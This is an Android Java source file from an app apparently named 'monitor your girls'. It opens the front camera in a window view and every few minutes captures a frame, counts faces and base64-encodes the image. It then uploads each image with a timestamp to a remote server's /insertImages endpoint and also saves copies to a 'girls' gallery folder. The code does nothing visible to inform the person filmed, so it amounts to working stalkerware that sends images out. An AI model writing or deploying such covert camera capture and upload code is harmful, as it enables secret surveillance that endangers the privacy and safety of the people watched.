package camera.log;



import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.media.FaceDetector;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Surface;
import android.view.TextureView;
import android.view.TextureView.SurfaceTextureListener;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.Toast;

import android.content.ContentValues;

import com.dk.monitoryourgilrs.R;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Map;

import Beans.ResponseBean;
import utils.SetUtil;
import utils.TimeUtils;
import utils.VolleyUtils;


public class MyWindow extends LinearLayout implements SurfaceTextureListener {

    private TextureView textureView;

    /**
     * 相机类
     */
    private Camera myCamera;
    private Context context;

    private WindowManager mWindowManager;
    private int num = 0;
    private Bitmap bitmap_get = null;
    public static final int BUFFERTAG = 100;
    public static final int BUFFERTAG1 = 101;
    private boolean isGetBuffer = true;
    private String TAG = "CAMERA 11";
    private  String imageURL = VolleyUtils.IP+ "/insertImages";


    public MyWindow(Context context) {
        super(context);
        LayoutInflater.from(context).inflate(R.layout.window, this);
        this.context = context;

        initView();
    }

    private void initView() {

        textureView = (TextureView) findViewById(R.id.textureView);
        textureView.setSurfaceTextureListener(this);
        mWindowManager = (WindowManager) context.getSystemService(Service.WINDOW_SERVICE);
    }

    @Override
    public void onSurfaceTextureAvailable(SurfaceTexture surface, int width, int height) {
        if (myCamera == null ) {
            // 创建Camera实例
            //尝试开启前置摄像头
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    try {
                        Log.d(TAG, "tryToOpenCamera");
                        myCamera = Camera.open(camIdx);
                    } catch (RuntimeException e) {
                        e.printStackTrace();
                        Log.d(TAG, "getCameraInfo");
                    }
                }
            }
            try {
                // 设置预览在textureView上
                myCamera.setPreviewTexture(surface);
                myCamera.setDisplayOrientation(SetDegree(MyWindow.this));
                // 开始预览
                myCamera.startPreview();
                handler.sendEmptyMessage(BUFFERTAG);
            } catch (IOException e) {
                e.printStackTrace();
                Log.v(TAG,"sendEmptyMessage");
            }
        }
    }

    private void getPreViewImage() {

        if (myCamera != null){
            myCamera.setOneShotPreviewCallback(new Camera.PreviewCallback(){

                @Override
                public void onPreviewFrame(byte[] data, Camera camera) {
                    Camera.Size size = camera.getParameters().getPreviewSize();
                    try{
                        YuvImage image = new YuvImage(data, ImageFormat.NV21, size.width, size.height, null);
                        if(image!=null){
                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                            image.compressToJpeg(new Rect(0, 0, size.width, size.height), 80, stream);

                            bitmap_get = BitmapFactory.decodeByteArray(stream.toByteArray(), 0, stream.size());

                            //**********************
                            //因为图片会放生旋转，因此要对图片进行旋转到和手机在一个方向上
                            bitmap_get = rotateMyBitmap(bitmap_get);
                            //**********************************

                            stream.close();


                        }
                    }catch(Exception ex){
                        Log.e(TAG,"Error:  rotateMyBitmap "+ex.getMessage());
                    }
                }


            });
        }


    }

    private int myFace(Bitmap bitmap) {
        bitmap = bitmap.copy(Bitmap.Config.RGB_565, true);
        //假设最多有1张脸
        int MAXfFaces = 99;
        FaceDetector mFaceDetector = new FaceDetector(bitmap.getWidth(),bitmap.getHeight(),MAXfFaces);
        FaceDetector.Face[] mFace = new FaceDetector.Face[MAXfFaces];
        //获取实际上有多少张脸
        int numOfFaces = mFaceDetector.findFaces(bitmap, mFace);
        Log.v(TAG,  "pic num:" + num + "  face num:"+numOfFaces );
        if(numOfFaces > 0){
            Log.d(TAG, "one at least" );
            return numOfFaces;
        }
        return 0;

    }

    public Bitmap rotateMyBitmap(Bitmap mybmp) throws IOException {
        //*****旋转一下

        Matrix matrix = new Matrix();
        matrix.postRotate(270);

        Bitmap bitmap = Bitmap.createBitmap(mybmp.getWidth(), mybmp.getHeight(), Bitmap.Config.ARGB_8888);

        Bitmap nbmp2 = Bitmap.createBitmap(mybmp, 0,0, mybmp.getWidth(),  mybmp.getHeight(), matrix, true);

//        saveImage(nbmp2);
        int numOfFace = myFace(nbmp2);
        transferImage(nbmp2,numOfFace);
        return nbmp2;
    };

    Handler handler = new Handler(){
        public void handleMessage(android.os.Message msg) {
            switch(msg.what){
                case BUFFERTAG:
                    if(isGetBuffer){
                        num++;
                        getPreViewImage(); //从预览框中得到当前图像
                        handler.sendEmptyMessageDelayed(BUFFERTAG1, 60000 * 2 ); //会在规定的延迟的发送消息
                    }else{
//                        myCamera.setPreviewCallback(null);
                    }
                    break;
                case BUFFERTAG1:
//                    myCamera.setPreviewCallback(null);
                    handler.sendEmptyMessageDelayed(BUFFERTAG, 60000 * 3 );
                    break ;
            }
        };


    };

    Runnable runnable=new Runnable(){
        @Override
        public void run() {
            // TODO Auto-generated method stub  
            //要做的事情，这里再次调用此Runnable对象，以实现每两秒实现一次的定时器操作  

            handler.postDelayed(this, 10000);
            Log.d(TAG, "running!!!");
        }
    };


    private int SetDegree(MyWindow myWindow) {
        // 获得手机的方向
        int rotation = mWindowManager.getDefaultDisplay().getRotation();
        int degree = 0;
        // 根据手机的方向计算相机预览画面应该选择的角度
        switch (rotation) {
            case Surface.ROTATION_0:
                degree = 90;
                break;
            case Surface.ROTATION_90:
                degree = 0;
                break;
            case Surface.ROTATION_180:
                degree = 270;
                break;
            case Surface.ROTATION_270:
                degree = 180;
                break;
        }
        return degree;
    }


    private void saveImage(Bitmap bmp) throws IOException {
        myFace(bmp);

//        String dir = Environment.getExternalStorageDirectory().getPath()+"/myImage/" ; //安卓Q已经不可以使用
        String fileName = context.getFilesDir().getPath() + File.pathSeparator+"girls"+ File.pathSeparator + "Camera"+ num +".jpg";
        Log.v(TAG,context.getFilesDir().getPath());
        File file = new File(fileName);
        if(!file.exists() ){
            //先得到文件的上级目录，并创建上级目录，在创建文件
            if(file.getParentFile() != null && !file.getParentFile().exists())
                file.getParentFile().mkdir();
        }
        saveImageWithAndroidQ2outStorege(context,bmp,System.currentTimeMillis()+".jpg","girls");
        try {
            FileOutputStream fos = new FileOutputStream(file);
            bmp.compress(Bitmap.CompressFormat.JPEG, 100, fos);
            Log.v( TAG,String.valueOf(bmp.getHeight()));
            fos.flush();
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 通过MediaStore保存，兼容AndroidQ，保存成功自动添加到相册数据库，无需再发送广播告诉系统插入相册
     *
     * @param context context
     * @param bitmap 源文件
     * @param saveFileName 保存的文件名
     * @param saveDirName picture子目录
     * @return 成功或者失败
     */
    private   boolean saveImageWithAndroidQ2outStorege(Context context,
                                                       Bitmap bitmap,
                                                       String saveFileName,
                                                       String saveDirName) throws IOException {

        File sourceFile = saveBitmapAsFile(bitmap);
        ContentValues values = new ContentValues();
        values.put(MediaStore.Images.Media.DESCRIPTION, "This is an image");
        values.put(MediaStore.Images.Media.DISPLAY_NAME, saveFileName);
        values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpg");
        values.put(MediaStore.Images.Media.TITLE, "Image.jpg");
        values.put(MediaStore.Images.Media.RELATIVE_PATH, "Pictures/" + saveDirName);

        Uri external = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        ContentResolver resolver = context.getContentResolver();

        Uri insertUri = resolver.insert(external, values);
        BufferedInputStream inputStream = null;
        OutputStream os = null;
        boolean result = false;
        try {
            inputStream = new BufferedInputStream(new FileInputStream(sourceFile));
            if (insertUri != null) {
                os = resolver.openOutputStream(insertUri);
            }
            if (os != null) {
                byte[] buffer = new byte[1024 * 4];
                int len;
                while ((len = inputStream.read(buffer)) != -1) {
                    os.write(buffer, 0, len);
                }
                os.flush();
            }
            result = true;
        } catch (IOException e) {
            result = false;
        } finally {
            os.close();
        }
        return result;
    }

    private  File  saveBitmapAsFile(final Bitmap bitmap) {
        String fileName = context.getFilesDir().getPath() + "Camera"+ num +".jpg";
        final File file = new File(fileName);//将要保存图片的路径
//        try {

        Thread thread =  new Thread(){
                @Override
                public void run() {
                    BufferedOutputStream bos = null;
                    try {
                        bos = new BufferedOutputStream(new FileOutputStream(file));
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    }
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos);
                    try {
                        bos.flush();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        bos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            };
        thread.start();
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
//            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file));
//            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos);
//            bos.flush();
//            bos.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        return file;
    }

    private void transferImage(final Bitmap bitmap, final int numOfFace){
        String bases = bitmapToBase64(bitmap);
        if (utils.NetWorkUtils.isNetworkConnected(context)) {
            Log.v(TAG, "NetWork ok !");

            VolleyUtils.create(context)
                    .post(imageURL, ResponseBean.class, new VolleyUtils.OnResponse<ResponseBean>() {
                        @Override
                        public void OnMap(Map<String, String> map) {
                            map.put("_id", String.valueOf(TimeUtils.getTimeStame()));
                            map.put("date", TimeUtils.dateToString(TimeUtils.getTimeStame()));
                            map.put("image", bitmapToBase64(bitmap));
                            map.put("numOfFace", String.valueOf(numOfFace));
                        }

                        @Override
                        public void onSuccess(ResponseBean response) {
                            Log.e(TAG, "response---->" + response);
                        }

                        @Override
                        public void onError(String error) {
                            Log.e(TAG, "error---->" + error);
                        }
                    });
        }else{
            Log.v(TAG, "NetWork not ok !");
        }
    }


    private static String bitmapToBase64(Bitmap bitmap) {

        String result = null;
        ByteArrayOutputStream baos = null;
        try {
            if (bitmap != null) {
                baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);

                baos.flush();
                baos.close();

                byte[] bitmapBytes = baos.toByteArray();
                result = Base64.encodeToString(bitmapBytes, Base64.DEFAULT);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (baos != null) {
                    baos.flush();
                    baos.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return result;
    }

    @Override
    public boolean onSurfaceTextureDestroyed(SurfaceTexture surface) {
        myCamera.stopPreview(); //停止预览
        myCamera.release();     // 释放相机资源
        myCamera = null;
        Log.v(TAG,"onSurfaceTextureDestroyed");
        return false;
    }

    @Override
    public void onSurfaceTextureSizeChanged(SurfaceTexture surface, int width, int height) {

    }

    @Override
    public void onSurfaceTextureUpdated(SurfaceTexture surface) {

    }

}